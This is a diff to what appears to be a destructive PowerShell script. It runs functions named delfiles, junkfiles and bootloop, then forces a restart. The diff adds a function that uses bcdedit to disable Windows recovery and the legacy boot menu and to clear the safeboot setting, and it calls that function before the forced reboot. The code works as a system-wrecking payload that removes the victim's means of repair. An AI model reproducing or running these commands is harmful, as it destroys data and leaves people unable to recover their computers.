@@ -86,9 +86,23 @@ function bootloop {
     }
 }
 
+function disablesafemode {# 1. Disable the Advanced Boot/Recovery Menu
+# This stops the "Choose an option" screen from appearing
+bcdedit /set "{default}" recoveryenabled No
+
+# 2. Disable the 'F8' Legacy Boot Menu (just in case it's enabled)
+bcdedit /set "{default}" bootmenupolicy standard
+
+# 3. Optional: Delete the Safeboot value to ensure it's not currently set
+# This prevents the machine from being "stuck" in a boot loop
+bcdedit /deletevalue "{current}" safeboot
+}
+
 admin
 delfiles
 Start-Sleep -Seconds 0.1
 junkfiles
 bootloop
+disablesafemode
+Start-Sleep -Seconds 0.5
 Restart-Computer -Force
